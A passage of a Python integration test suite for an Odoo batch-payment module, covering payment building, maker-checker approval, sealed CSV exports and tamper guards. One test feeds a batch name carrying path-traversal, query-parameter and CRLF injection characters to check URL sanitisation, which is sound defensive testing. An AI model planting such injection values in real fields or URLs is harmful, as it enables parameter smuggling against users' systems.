# -*- encoding: utf-8 -*-
##############################################################################
#
# ERP Heritage
# Copyright (C) 2026 (https://www.erpheritage.com.au/)
#
##############################################################################
"""End-to-end batch-payment accounting, security, upgrade, and race tests.

The suite covers inbound/outbound build and aggregation, multi-currency and
partial settlement, maker-checker lifecycle, immutable exports, reversal,
reconciliation/provenance guards, multi-company authorization, migration,
lock ordering, failure atomicity, and real independent-connection exclusion.
"""

import base64
import csv
import io
import json
import sys
from urllib.parse import parse_qs, urlsplit
from unittest.mock import patch

import odoo
from psycopg2 import OperationalError, errorcodes

from odoo import Command, SUPERUSER_ID, api, fields
from odoo.exceptions import AccessError, UserError
from odoo.tests import TransactionCase, new_test_user, tagged

from odoo.addons.eh_account_base.tests.common import EhAccountIntegrationTestCase
from odoo.addons.eh_account_batch_payment.models.capabilities import (
    AUTHORIZED_BATCH_EXPORT_CAPABILITY,
    AUTHORIZED_BATCH_EXPORT_CONTEXT,
    AUTHORIZED_BATCH_WORKFLOW_CAPABILITY,
    AUTHORIZED_BATCH_WORKFLOW_CONTEXT,
)
from odoo.addons.eh_account_batch_payment.models.batch_payment import (
    _OWNER_LOCK_STRIPES,
    POSTED_STATES,
)


@tagged('eh_account_batch_payment', 'integration', 'post_install', '-at_install')
class TestBatchPayment(EhAccountIntegrationTestCase):

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.Batch = cls.env['eh.batch.payment']
        cls.Wizard = cls.env['eh.batch.payment.build.wizard']

        cls.bank_journal = cls.env['account.journal'].search(
            [('type', '=', 'bank'),
             ('company_id', '=', cls.env.company.id)],
            limit=1,
        )
        if not cls.bank_journal:
            cls.bank_journal = cls.env['account.journal'].create({
                'name': 'Test Bank',
                'code': 'TBK',
                'type': 'bank',
                'company_id': cls.env.company.id,
            })

        # Promote the test user so action_post passes the manager guard.
        cls.env.user.group_ids |= cls.env.ref(
            'eh_account_base.group_eh_manager',
        )
        cls.accountant_user = new_test_user(
            cls.env,
            login='eh_batch_payment_accountant',
            groups='eh_account_base.group_eh_user',
        )

    def _post_supplier_invoice(self, partner, amount):
        move = self.env['account.move'].create({
            'move_type': 'in_invoice',
            'partner_id': partner.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Demo line',
                'quantity': 1,
                'price_unit': amount,
                'account_id': self.account_expense.id,
            })],
        })
        move.action_post()
        return move

    def _post_customer_invoice(self, partner, amount):
        move = self.env['account.move'].create({
            'move_type': 'out_invoice',
            'partner_id': partner.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Customer batch receipt line',
                'quantity': 1,
                'price_unit': amount,
                'account_id': self.account_revenue.id,
            })],
        })
        move.action_post()
        return move

    def test_server_company_paid_expense_style_move_link_is_allowed(self):
        """Trusted core workflow may bind its pre-created payment move."""
        method_line = self.bank_journal.outbound_payment_method_line_ids[:1]
        outstanding = self._ensure_account(
            self.env, '1098', 'Outstanding Payments', 'asset_current',
        )
        if not outstanding.reconcile:
            outstanding.reconcile = True
        if 'payment_account_id' in method_line._fields:
            method_line.payment_account_id = outstanding
        move = self.env['account.move'].sudo().create({
            'move_type': 'entry',
            'company_id': self.company.id,
            'journal_id': self.bank_journal.id,
            'date': '2026-04-15',
            'line_ids': [(0, 0, {
                'name': 'Company-paid expense bank leg',
                'account_id': outstanding.id,
                'partner_id': self.partner_a.id,
                'credit': 100.0,
            }), (0, 0, {
                'name': 'Company-paid expense clearing leg',
                'account_id': self.account_payable.id,
                'partner_id': self.partner_a.id,
                'debit': 100.0,
            })],
        })
        vals = {
            'payment_type': 'outbound',
            'partner_type': 'supplier',
            'partner_id': self.partner_a.id,
            'amount': 100.0,
            'currency_id': self.company.currency_id.id,
            'date': '2026-04-15',
            'journal_id': self.bank_journal.id,
            'payment_method_line_id': method_line.id,
            'move_id': move.id,
        }
        if odoo.release.version_info[0] <= 17:
            # Delegated payment creation otherwise appends a second pair of
            # default lines to the already prepared move.
            vals['line_ids'] = []
        with self.assertRaisesRegex(UserError, 'trusted server workflow'):
            self.env['account.payment'].with_user(
                self.accountant_user,
            ).create(vals)

        payment = self.env['account.payment'].sudo().create(vals)
        self.assertEqual(payment.move_id, move)

    @staticmethod
    def _payment_state_value(value):
        if odoo.release.version_info[0] <= 17:
            return {
                'in_process': 'posted',
                'canceled': 'cancel',
            }.get(value, value)
        return value

    def _ensure_tax_country(self):
        """Return a country accepted by the active series' tax validator."""
        Company = self.env['res.company']
        fiscal_country = (
            self.company.account_fiscal_country_id
            if 'account_fiscal_country_id' in Company._fields
            else self.env['res.country']
        )
        country = fiscal_country or self.company.country_id
        if not country:
            country = self.env.ref('base.us')
        company_vals = {}
        if not self.company.country_id:
            company_vals['country_id'] = country.id
        if (
            'account_fiscal_country_id' in Company._fields
            and not self.company.account_fiscal_country_id
        ):
            company_vals['account_fiscal_country_id'] = country.id
        if company_vals:
            self.company.write(company_vals)
        return country

    def _sql_update_payment_field(self, payment, field_name, value):
        """Seed legacy corruption on payment or delegated move storage."""
        self.assertIn(field_name, {
            'state', 'company_id', 'is_reconciled',
        })
        self.env.cr.execute(
            "SELECT EXISTS (SELECT 1 FROM pg_attribute "
            "WHERE attrelid = 'account_payment'::regclass "
            "AND attname = %s AND attnum > 0 AND NOT attisdropped)",
            (field_name,),
        )
        if self.env.cr.fetchone()[0]:
            table = 'account_payment'
            record_id = payment.id
        else:
            table = 'account_move'
            record_id = payment.move_id.id
        self.env.cr.execute(
            "UPDATE %s SET %s = %%s WHERE id = %%s" % (
                table, field_name,
            ),
            (value, record_id),
        )
        if table == 'account_move':
            # Odoo 16/17 expose delegated move fields through account.payment,
            # but their authoritative cache entry still belongs to move_id.
            payment.move_id.invalidate_recordset([field_name])

    def _sql_update_batch_fields(self, batch, values):
        """Seed legacy/header corruption without invoking workflow guards."""
        allowed = {
            'state', 'integrity_digest', 'integrity_quarantined',
            'export_snapshot_json',
            'confirmed_at', 'confirmed_by_id',
            'posted_at', 'posted_by_id',
            'cancelled_at', 'cancelled_by_id',
        }
        self.assertTrue(set(values).issubset(allowed))
        field_names = sorted(values)
        batch.flush_recordset(field_names)
        parameters = []
        for field_name in field_names:
            value = values[field_name]
            if value is False and batch._fields[field_name].type != 'boolean':
                value = None
            parameters.append(value)
        parameters.append(batch.id)
        self.env.cr.execute(
            "UPDATE eh_batch_payment SET %s WHERE id = %%s" % ', '.join(
                '"%s" = %%s' % field_name for field_name in field_names
            ),
            tuple(parameters),
        )
        batch.invalidate_recordset(field_names)

    def _assert_unposted_payment_moves(self, payments):
        """Assert rollback shape on modern and legacy payment APIs."""
        payments.invalidate_recordset(['state', 'move_id'])
        moves = payments.mapped('move_id')
        moves.invalidate_recordset(['state'])
        self.assertEqual(set(payments.mapped('state')), {'draft'})
        if 'origin_payment_id' in self.env['account.move']._fields:
            self.assertFalse(moves)
        else:
            self.assertEqual(len(moves), len(payments))
            self.assertEqual(set(moves.mapped('state')), {'draft'})

    # ---- lifecycle ----

    def test_create_assigns_sequence(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.assertNotEqual(batch.name, '/')
        self.assertTrue(batch.name.startswith('BATCH-OUT/'))

    def test_confirm_empty_batch_raises(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_confirm()

    def test_confirm_advances_state(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        # Drop in a draft payment to satisfy the empty-batch guard.
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.assertEqual(batch.state, 'confirmed')
        self.assertTrue(batch.confirmed_at)
        self.assertEqual(batch.confirmed_by_id, self.env.user)

    def test_confirmed_context_notes_cannot_be_rewritten(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'notes': 'Maker context retained for reviewer',
        })
        original_notes = batch.notes
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.write({'notes': 'silently replaced after approval'})
        self.assertEqual(batch.notes, original_notes)

    def test_cancel_blocked_when_posted(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        # Historic-corruption fixture: sanctioned actions cannot produce a
        # posted empty batch, and direct non-sudo state writes are now guarded.
        self._sql_update_batch_fields(batch, {'state': 'posted'})
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_cancel()

    # ---- build wizard ----

    def test_build_aggregated_per_partner(self):
        """Three invoices for partner A and one for partner B should
        produce two aggregated payments.
        """
        a1 = self._post_supplier_invoice(self.partner_a, 100.0)
        a2 = self._post_supplier_invoice(self.partner_a, 200.0)
        a3 = self._post_supplier_invoice(self.partner_a, 50.0)
        b1 = self._post_supplier_invoice(self.partner_b, 300.0)

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, [a1.id, a2.id, a3.id, b1.id])],
        })
        wizard.action_build()
        self.assertEqual(len(batch.payment_ids), 2)
        partner_a_payment = batch.payment_ids.filtered(
            lambda p: p.partner_id == self.partner_a,
        )
        self.assertEqual(len(partner_a_payment), 1)
        self.assertAlmostEqual(partner_a_payment.amount, 350.0)
        partner_b_payment = batch.payment_ids.filtered(
            lambda p: p.partner_id == self.partner_b,
        )
        self.assertAlmostEqual(partner_b_payment.amount, 300.0)

    def test_build_per_invoice_no_aggregation(self):
        a1 = self._post_supplier_invoice(self.partner_a, 100.0)
        a2 = self._post_supplier_invoice(self.partner_a, 200.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': False,
            'move_ids': [(6, 0, [a1.id, a2.id])],
        })
        wizard.action_build()
        self.assertEqual(len(batch.payment_ids), 2)

    def test_build_multi_create_validates_complete_batch_once(self):
        sources = self.env['account.move']
        for index in range(4):
            partner = self.env['res.partner'].create({
                'name': 'Bulk build partner %s' % index,
            })
            sources |= self._post_supplier_invoice(partner, 100.0 + index)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': False,
            'move_ids': [(6, 0, sources.ids)],
        })
        BatchModel = type(self.Batch)
        real_validate = BatchModel._eh_validate_integrity
        validation_calls = []

        def _record_validation(batches, *args, **kwargs):
            validation_calls.append(tuple(batches.ids))
            return real_validate(batches, *args, **kwargs)

        with patch.object(
            BatchModel,
            '_eh_validate_integrity',
            _record_validation,
        ):
            wizard.action_build()

        self.assertEqual(len(batch.payment_ids), len(sources))
        self.assertEqual(
            validation_calls,
            [(batch.id,)],
            "a multi-payment build must walk the complete graph only once",
        )

    def test_inbound_batch_build_confirm_post_reconcile_and_export(self):
        source = self._post_customer_invoice(self.partner_a, 125.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'inbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': False,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()

        payment = batch.payment_ids
        self.assertEqual(len(payment), 1)
        self.assertEqual(payment.payment_type, 'inbound')
        self.assertEqual(payment.partner_type, 'customer')
        self.assertEqual(payment.eh_source_move_ids, source)

        batch.action_confirm()
        approved_content, _filename = batch._eh_render_approved_export()
        approved_rows = list(csv.reader(io.StringIO(
            approved_content.decode('utf-8'),
        )))
        self.assertEqual(approved_rows[1][0], source.name)
        self.assertTrue(approved_rows[1][0])

        batch.with_user(self._make_checker_manager()).action_post()
        batch.invalidate_recordset(['state', 'export_file'])
        payment.invalidate_recordset(['state', 'move_id'])
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertEqual(batch.state, 'posted')
        self.assertIn(payment.state, POSTED_STATES)
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))
        self.assertEqual(source.payment_state, 'paid')

        outstanding = payment._eh_expected_outstanding_account()
        receipt_lines = payment.move_id.line_ids.filtered(
            lambda line: line.account_id == outstanding,
        )
        receivable_lines = payment.move_id.line_ids.filtered(
            lambda line: line.account_id.account_type == 'asset_receivable',
        )
        self.assertTrue(receipt_lines)
        self.assertTrue(receivable_lines)
        self.assertGreater(sum(receipt_lines.mapped('balance')), 0.0)
        self.assertLess(sum(receivable_lines.mapped('balance')), 0.0)
        self.assertEqual(
            base64.b64decode(batch.export_file),
            approved_content,
        )
        self.assertEqual(batch.action_export_csv()['target'], 'download')

    def _post_supplier_refund(self, partner, amount):
        move = self.env['account.move'].create({
            'move_type': 'in_refund',
            'partner_id': partner.id,
            'invoice_date': '2026-04-15',
            'invoice_line_ids': [(0, 0, {
                'name': 'Demo refund line',
                'quantity': 1,
                'price_unit': amount,
                'account_id': self.account_expense.id,
            })],
        })
        move.action_post()
        return move

    def test_build_nets_credit_note_not_grosses(self):
        # A vendor bill of 300 and a vendor refund of 100 for the same
        # partner must net to a 200 payment, not gross up to 400. abs()-summing
        # the residuals (the old behaviour) over-pays the vendor by 2x the
        # refund.
        bill = self._post_supplier_invoice(self.partner_a, 300.0)
        refund = self._post_supplier_refund(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard = self.Wizard.create({
            'batch_id': batch.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, [bill.id, refund.id])],
        })
        wizard.action_build()
        self.assertEqual(len(batch.payment_ids), 1)
        self.assertAlmostEqual(batch.payment_ids.amount, 200.0)
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        bill.invalidate_recordset(['amount_residual', 'payment_state'])
        refund.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertTrue(bill.currency_id.is_zero(bill.amount_residual))
        self.assertTrue(refund.currency_id.is_zero(refund.amount_residual))

    def test_same_source_cannot_be_double_batched(self):
        # Building the same open bill into a second batch would pay the vendor
        # twice for one document; the wizard must refuse it.
        bill = self._post_supplier_invoice(self.partner_a, 500.0)
        batch1 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch1.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        }).action_build()
        self.assertEqual(len(batch1.payment_ids), 1)

        batch2 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        wizard2 = self.Wizard.create({
            'batch_id': batch2.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        })
        with self.assertRaisesRegex(UserError, r'\S'):
            wizard2.action_build()

        # Once the first batch is cancelled, the bill is free to be batched.
        batch1.action_cancel()
        wizard2.action_build()
        self.assertEqual(len(batch2.payment_ids), 1)

    def test_double_batch_guard_pivots_on_live_draft_claim(self):
        """The double-batch guard must fire ONLY while the prior claim is a
        live, unposted (draft) payment - the real double-pay window. Once that
        payment leaves draft (posted, then reversed on an NSF bounce, or a
        partial settlement leaving a remainder owed), the still-owed source
        must be re-collectable through the wizard. This proves BOTH:
        (b) the original hole stays closed - a live draft claim is refused; and
        (a) the over-restriction is fixed - a non-draft prior claim no longer
        strands a bounced/partially-settled source.

        The guard carries no superuser bypass (no env.su / sudo / has_group),
        so it raises identically for any actor; the acting user's privilege
        is irrelevant to the refusal, unlike an env.su-gated write guard."""
        bill = self._post_supplier_invoice(self.partner_a, 500.0)
        batch1 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-30',
        })
        self.Wizard.create({
            'batch_id': batch1.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        }).action_build()
        p1 = batch1.payment_ids
        self.assertEqual(len(p1), 1)
        self.assertEqual(
            p1.state, 'draft',
            "A freshly built batch payment is a live, unposted claim.",
        )

        batch2 = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-05-31',
        })
        wizard2 = self.Wizard.create({
            'batch_id': batch2.id,
            'aggregate_per_partner': True,
            'move_ids': [(6, 0, bill.ids)],
        })

        # (b) Hole stays closed: while P1 is a live draft claim, building the
        # same bill into a second batch is refused before any payment is
        # created, so the vendor cannot be paid twice.
        with self.assertRaisesRegex(UserError, r'\S'):
            wizard2.action_build()
        self.assertFalse(
            batch2.payment_ids,
            "The refused build must not have created any payment.",
        )

        # (a) Over-restriction fixed for a legacy posted/reversed claim. New
        # ORM calls cannot change a draft batch member's state outside the
        # batch workflow; SQL models the pre-hardening non-draft row that an
        # upgrade must not strand forever.
        self._sql_update_payment_field(
            p1, 'state', self._payment_state_value('in_process'),
        )
        p1.invalidate_recordset(['state'])
        self.assertNotEqual(p1.state, 'draft')
        # The bill's residual is still owed, so it must now re-collect.
        self.assertNotEqual(bill.amount_residual, 0.0)
        wizard2.action_build()
        self.assertEqual(
            len(batch2.payment_ids), 1,
            "A source whose only prior claim is no longer a live draft "
            "payment must be re-batchable.",
        )

    # ---- totals ----

    def test_total_amount_reflects_payment_sum(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_b.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 250.0,
            'date': '2026-04-15',
        })
        batch.invalidate_recordset()
        self.assertEqual(batch.payment_count, 2)
        self.assertAlmostEqual(batch.total_amount, 350.0)

    def test_list_statistics_use_stored_counts_and_omit_zeroes(self):
        empty_batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        empty_batch.invalidate_recordset(['eh_list_statistics'])
        self.assertFalse(empty_batch.eh_list_statistics)

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.invalidate_recordset([
            'payment_count', 'posted_count', 'reconciled_count',
            'eh_list_statistics',
        ])
        self.assertEqual(
            [(item['label'], item['value'])
             for item in batch.eh_list_statistics],
            [("Payments", 1)],
        )
        self.assertEqual(
            [(item['label'], item['actionMethod'])
             for item in batch._eh_list_statistics_hook()[batch.id]],
            [("Payments", 'action_view_payments')],
        )

    def test_list_statistics_actions_match_empty_and_partial_counts(self):
        expected_list_type = (
            'list' if odoo.release.version_info[0] >= 18 else 'tree'
        )

        def assert_action(action, domain, expected_count):
            self.assertEqual(action['res_model'], 'account.payment')
            self.assertEqual(
                action['view_mode'], '%s,form' % expected_list_type,
            )
            self.assertEqual(
                action['views'][0], (False, expected_list_type),
            )
            self.assertNotIn('res_id', action)
            self.assertEqual(action['domain'], domain)
            self.assertEqual(
                self.env['account.payment'].search_count(action['domain']),
                expected_count,
            )

        empty_batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        empty_domain = [('eh_batch_payment_id', '=', empty_batch.id)]
        assert_action(empty_batch.action_view_payments(), empty_domain, 0)
        assert_action(
            empty_batch.action_view_posted_payments(),
            empty_domain + [('state', 'in', list(POSTED_STATES))],
            0,
        )
        assert_action(
            empty_batch.action_view_reconciled_payments(),
            empty_domain + [('is_reconciled', '=', True)],
            0,
        )

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        payments = self.env['account.payment']
        for partner, amount in (
                (self.partner_a, 100.0),
                (self.partner_b, 50.0)):
            payments |= self.env['account.payment'].create({
                'eh_batch_payment_id': batch.id,
                'partner_id': partner.id,
                'partner_type': 'supplier',
                'payment_type': 'outbound',
                'journal_id': self.bank_journal.id,
                'amount': amount,
                'date': '2026-04-15',
            })
        selected = payments[:1]
        self._sql_update_payment_field(
            selected,
            'state',
            self._payment_state_value('in_process'),
        )
        self._sql_update_payment_field(
            selected, 'is_reconciled', True,
        )
        payments.invalidate_recordset(['state', 'is_reconciled'])
        if odoo.release.version_info[0] <= 17:
            payments.mapped('move_id').invalidate_recordset(['state'])
        guarded_batch = batch.sudo().with_context(**{
            AUTHORIZED_BATCH_WORKFLOW_CONTEXT:
                AUTHORIZED_BATCH_WORKFLOW_CAPABILITY,
        })
        guarded_batch._compute_totals()
        batch.invalidate_recordset([
            'payment_count', 'posted_count', 'reconciled_count',
            'eh_list_statistics',
        ])
        self.assertEqual(
            (batch.payment_count, batch.posted_count, batch.reconciled_count),
            (2, 1, 1),
        )
        self.assertEqual(
            [(item['label'], item['value'], item['actionMethod'])
             for item in batch._eh_list_statistics_hook()[batch.id]],
            [
                ("Payments", 2, 'action_view_payments'),
                ("Posted", 1, 'action_view_posted_payments'),
                ("Reconciled", 1, 'action_view_reconciled_payments'),
            ],
        )

        domain = [('eh_batch_payment_id', '=', batch.id)]
        assert_action(
            batch.action_view_payments(), domain, batch.payment_count,
        )
        assert_action(
            batch.action_view_posted_payments(),
            domain + [('state', 'in', list(POSTED_STATES))],
            batch.posted_count,
        )
        assert_action(
            batch.action_view_reconciled_payments(),
            domain + [('is_reconciled', '=', True)],
            batch.reconciled_count,
        )

    def test_stored_totals_and_reconciliation_badges_are_engine_owned(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        manager = self._make_checker_manager()
        for field_name, forged_value in (
            ('payment_count', 999),
            ('total_amount', 999999.0),
            ('posted_count', 999),
            ('reconciled_count', 999),
            ('is_fully_reconciled', True),
            ('currency_id', self.env.ref('base.USD').id),
        ):
            with self.assertRaises(AccessError):
                batch.with_user(manager).write({field_name: forged_value})
        self.assertEqual(batch.payment_count, 0)
        self.assertEqual(batch.total_amount, 0.0)
        self.assertFalse(batch.is_fully_reconciled)

    def test_member_reconciliation_badges_are_workflow_owned(self):
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        batch.action_confirm()

        for field_name in ('is_reconciled', 'is_matched'):
            try:
                member.write({field_name: True})
            except UserError:
                pass
            else:
                self.fail('%s badge write unexpectedly passed' % field_name)
        member.invalidate_recordset(['is_reconciled', 'is_matched'])
        self.assertFalse(member.is_reconciled)
        self.assertFalse(member.is_matched)

    # ---- export ----

    def test_export_csv_returns_download_url(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
            'memo': 'INV-001',
        })
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        action = batch.action_export_csv()
        self.assertEqual(action['type'], 'ir.actions.act_url')
        # The export is served through the manager-only field route, not a
        # bare /web/content/<attachment_id> URL.
        self.assertIn(
            '/web/content/eh.batch.payment/%s/export_file' % batch.id,
            action['url'],
        )
        content = base64.b64decode(batch.export_file).decode('utf-8')
        self.assertIn(self.partner_a.display_name, content)
        self.assertIn('100.00', content)
        rows = list(csv.reader(io.StringIO(content)))
        self.assertEqual(rows[1][0], 'INV-001')

    def test_legacy_confirmed_blank_reference_must_be_reviewed_again(self):
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        rows = json.loads(batch.export_snapshot_json)
        rows[1][0] = ''
        blank_snapshot = json.dumps(
            rows,
            ensure_ascii=False,
            separators=(',', ':'),
        )
        # Model a batch confirmed before stable draft references were enforced.
        # Keep its digest internally consistent so the row-level guard, not a
        # generic tamper mismatch, proves that legacy blank evidence cannot post.
        self._sql_update_batch_fields(batch, {
            'export_snapshot_json': blank_snapshot,
            'integrity_digest': batch._eh_compute_integrity_digest(
                export_snapshot_json=blank_snapshot,
            ),
        })
        batch.invalidate_recordset([
            'export_snapshot_json', 'integrity_digest', 'state',
        ])

        with self.assertRaisesRegex(UserError, 'without a stable Reference'):
            batch.with_user(self._make_checker_manager()).action_post()

        batch.invalidate_recordset(['state'])
        batch.payment_ids.invalidate_recordset(['state'])
        self.assertEqual(batch.state, 'confirmed')
        self.assertEqual(batch.payment_ids.state, 'draft')

    def test_export_is_sealed_at_post_before_later_bank_master_edits(self):
        bank = self._create_partner_bank_as_validator({
            'partner_id': self.partner_a.id,
            'acc_number': 'APPROVED-ACCOUNT-123',
            'allow_out_payment': True,
        })
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_bank_id': bank.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()

        # Posting itself seals the bytes/hash. The first Export click is only
        # a download action and must never reconstruct data from mutable bank
        # master records.
        self.assertTrue(batch.export_file)
        self.assertTrue(batch.export_hash)
        approved_payload = base64.b64decode(batch.export_file)
        self.assertIn(b'APPROVED-ACCOUNT-123', approved_payload)

        bank_updates = {'acc_number': 'CHANGED-AFTER-POST'}
        if 'allow_out_payment' in bank._fields:
            bank_updates['allow_out_payment'] = False
        self._write_partner_bank_as_validator(bank, bank_updates)
        batch.action_export_csv()
        current_payload = base64.b64decode(batch.export_file)
        self.assertEqual(current_payload, approved_payload)
        self.assertNotIn(b'CHANGED-AFTER-POST', current_payload)

    def test_export_url_cannot_inject_query_parameters(self):
        batch = self.Batch.create({
            'name': '../PAY?x=1&access_token=public&unique=1#fragment\r\nX',
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()

        action = batch.action_export_csv()
        query = parse_qs(urlsplit(action['url']).query)
        self.assertEqual(set(query), {'download', 'filename'})
        self.assertEqual(query['download'], ['true'])
        self.assertEqual(query['filename'], [batch.export_filename])
        self.assertFalse(set('&?#\r\n/').intersection(batch.export_filename))

    def test_export_uses_currency_decimal_places(self):
        currency = self.env.ref('base.KWD')
        currency.active = True
        journal = self.env['account.journal'].create({
            'name': 'KWD Batch Bank',
            'code': 'KWBK',
            'type': 'bank',
            'company_id': self.env.company.id,
            'currency_id': currency.id,
        })
        batch = self.Batch.create({
            'journal_id': journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': journal.id,
            'amount': 100.123,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()

        rows = list(csv.reader(io.StringIO(
            base64.b64decode(batch.export_file).decode('utf-8'),
        )))
        self.assertEqual(currency.decimal_places, 3)
        self.assertEqual(rows[1][3], '100.123')

    def test_export_attachment_is_not_public(self):
        """The exported bank-detail file must be a private field
        attachment (res_field set, public False), so /web/content does
        not serve it to ordinary users or anonymous callers."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        batch.action_export_csv()
        # The attachment behind the field must carry res_field and must
        # not be public. Field attachments are excluded from the default
        # attachment search, so query with skip_res_field_check.
        attachment = self.env['ir.attachment'].with_context(
            skip_res_field_check=True,
        ).search([
            ('res_model', '=', 'eh.batch.payment'),
            ('res_id', '=', batch.id),
            ('res_field', '=', 'export_file'),
        ])
        self.assertTrue(
            attachment,
            "Export must be stored as a field attachment (res_field set).",
        )
        self.assertFalse(
            attachment.public,
            "Bank-detail export attachment must not be public.",
        )

    def test_export_attachment_relink_and_tamper_are_blocked(self):
        # Database storage makes direct db_datas reads observable alongside
        # raw/datas. Keep storage fixed for later tamper writes too.
        AttachmentModel = type(self.env['ir.attachment'])
        storage_patch = patch.object(
            AttachmentModel, '_storage', return_value='db',
